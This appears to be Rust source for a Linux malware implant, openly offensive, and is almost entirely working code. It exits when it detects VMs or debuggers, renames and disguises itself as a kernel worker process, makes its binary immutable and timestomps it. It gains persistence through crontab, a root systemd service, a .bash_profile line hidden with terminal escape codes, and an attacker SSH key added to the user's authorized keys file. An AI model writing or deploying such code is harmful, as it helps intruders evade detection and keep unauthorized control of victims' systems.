#![allow(unused)]
use std::{env, fs::{self, OpenOptions}, io::Write, os::unix::{fs::PermissionsExt, process::CommandExt}, path::Path, process::{self, exit, Command}};
use nix::{sys::{prctl, stat::utimes, time::TimeVal}, unistd::{fork, getuid, setsid}};

const VM: [&str; 5] =  ["vboxuser", "vboxguest", "vmware", "qemu", "hyperv"];
const DEBUG: [&str; 5] = ["gdb", "r2", "strace", "lldb", "ghidra"];
const PNAME: &str = "[kworker/ar.p]";

// Insert your ssh_pub_key
const SSH_KEY: &str = "";


pub fn check_vm() {
  
    // Checking if (/dev) present or not and checking vm drivers present from (VM)
    match fs::read_dir("/dev") {
        Err(_) => {
                        println!("Failed to get /dev");
                        exit(0);
                    },
        Ok(s) => { 
                                for file in s {
                                    
                                    let file = file.unwrap().file_name().to_string_lossy().into_owned();
                                    if VM.iter().any(|&v| v == file) {
                                        println!("Exiting vm driver detected");
                                        exit(0);
                                    }

                                }
                            } 
    }
}


pub fn check_debugger() {
 
    // Getting process status
    let status = fs::read_to_string("/proc/self/status").unwrap();

    // Getting ppid 
    let ppid = status.lines()
        .find(|&l| l.starts_with("PPid:"))
        .and_then(|l| l.split_whitespace().nth(1))
        .unwrap();

    // Getting debugger name
    let debugger = fs::read_link(format!("/proc/{}/exe", ppid)).unwrap().to_string_lossy().into_owned();

    for dbg in DEBUG {
        if debugger.contains(dbg) {
            println!("Exiting debugger detected");
            exit(0);
        }
    }
}

// Crude way of hiding binary and being persistence on machine
pub fn hide() {
            
    let exe = env::current_exe().unwrap();
    let fname = exe.file_name().unwrap().to_string_lossy().into_owned();   
    let crond = Path::new(&env::current_dir().unwrap()).join(".crond");
    
    if !fname.eq(".crond") {
        fs::rename(&exe, &crond).unwrap();
        println!("Binary name changed from:({}) to:(.crond)", fname); 
        Command::new(crond).exec();
    }

    // Making the binary file as immutable
    if getuid().is_root() {
        Command::new("chattr")
                .args(["+i", &exe.to_string_lossy().into_owned()])
                .spawn()
                .unwrap(); 
    }
}

pub fn process_stomp() {
   
    // Using prctl to set name for process
    prctl::set_name(&std::ffi::CString::new(PNAME).unwrap()).unwrap();

    // Overwritting the argv[0] index
    let args: Vec<_> = env::args().collect();
    if args.get(0).map(|s| s.as_str()).unwrap() != PNAME {
        let _ = Command::new("/proc/self/exe").arg0(PNAME).exec();
    }

    // Creating the child process
    if unsafe{ fork().unwrap() }.is_parent() {
        exit(0);
    }

    // Removing tty
    setsid().unwrap();

    // Revoking the session leader
    if unsafe{ fork().unwrap() }.is_parent() {
        exit(0);
    }
    
    println!("Process:({}) is spoofed to:({}) having pid:({})", env::current_exe().unwrap().file_name().unwrap().to_string_lossy().into_owned(), PNAME, process::id());
}


pub fn time_stomp() {

    // Changing time value of access and modified
    let atime = TimeVal::new(946_684_800, 0);  
    let mtime = TimeVal::new(946_684_800, 0);
   
    let path = env::current_exe().unwrap();
    
    // Updating timestamp 
    utimes(&path, &atime, &mtime).unwrap();
    println!("TimeStomped to 2000-01-01");
 
}


pub fn persistence() {
    
    if getuid().is_root() {
        println!("\n[*] Applying system level persistence [*]");
        crontab();
        ssh();
        systemd();
    } else {
        println!("\n[*] Applying user level persistence [*]");
        crontab();
        ssh();
        bash();
    }

}


fn crontab() {

    let expression = format!("* * * * * {}\n", env::current_exe().unwrap().to_string_lossy().to_owned());
    let mut file = env::current_dir().unwrap().to_string_lossy().into_owned();
    file.push_str("/cron");
 
    let output = Command::new("crontab").arg("-l").output().unwrap();
    let mut task = String::from_utf8(output.stdout).unwrap().trim().to_string();
 
    if !task.contains(&expression.trim()) {
    
        if !task.is_empty() {
            task += "\n";    
        }
        
        task += expression.as_str();
        fs::write(&file, &task).unwrap();

        Command::new("crontab").arg(&file).output().unwrap();
        fs::remove_file(file).unwrap();
    }
    
    println!("[~] Crontab persistence")
}


fn systemd() {
    
    let service = format!(
                                    "[Unit]
                                Description=ar.p

                                [Service]
                                Type=simple
                                User=root
                                WorkingDirectory={}
                                ExecStart={}
                                Restart=always
                                RestartSec=3

                                [Install]
                                WantedBy=multi-user.target",
                                env::current_dir().unwrap().to_string_lossy().into_owned(), 
                                env::current_exe().unwrap().to_string_lossy().into_owned()
                            );

    fs::write("/etc/systemd/system/ar.p.service", service).unwrap();
    Command::new("systemctl")
            .args(["enable","ar.p"])
            .output()
            .unwrap();

    println!("[~] Systemd persistence");
}


fn bash() {

    let expression = format!("#\x1B[1A\x1B[2K\x1B[1A\n{}\n#\x1B[2K\x1B[1A\x1B[2K\n", env::current_exe().unwrap().to_string_lossy().to_owned());
   
    let mut path = env::var("HOME").unwrap();
    path.push_str("/.bash_profile");

    if !Path::new(&path).exists() {
        fs::File::create(&path).unwrap();
        fs::set_permissions(&path, fs::Permissions::from_mode(0o644)).unwrap();  
    }

    let data = fs::read_to_string(&path).unwrap();
    if !data.contains(&expression.trim()) && Path::new(&path).exists() {
        let mut file = OpenOptions::new().append(true).open(&path).unwrap();
        file.write_all(expression.as_bytes()).unwrap();
    } 

    println!("[~] Bash_profile persistence");
}


fn ssh() {
   
    let ssh = Path::new(&env::var("HOME").unwrap()).join(".ssh");
    let key = Path::new(&env::var("HOME").unwrap()).join(".ssh/authorized_key");

    if !ssh.exists() {
        fs::create_dir_all(&ssh).unwrap();
        fs::set_permissions(&ssh, fs::Permissions::from_mode(0o700)).unwrap();
    }

    if !key.exists() {
        fs::File::create(&key).unwrap();
        fs::set_permissions(&key, fs::Permissions::from_mode(0o600)).unwrap();
    }
    
    let data = fs::read_to_string(&key).unwrap();
    if !data.contains(SSH_KEY.trim()) {
        let mut file = OpenOptions::new().append(true).open(&key).unwrap();
        file.write(b"\n").unwrap();
        file.write_all(SSH_KEY.as_bytes()).unwrap(); 
    }

    println!("[~] SSH persistence");
}
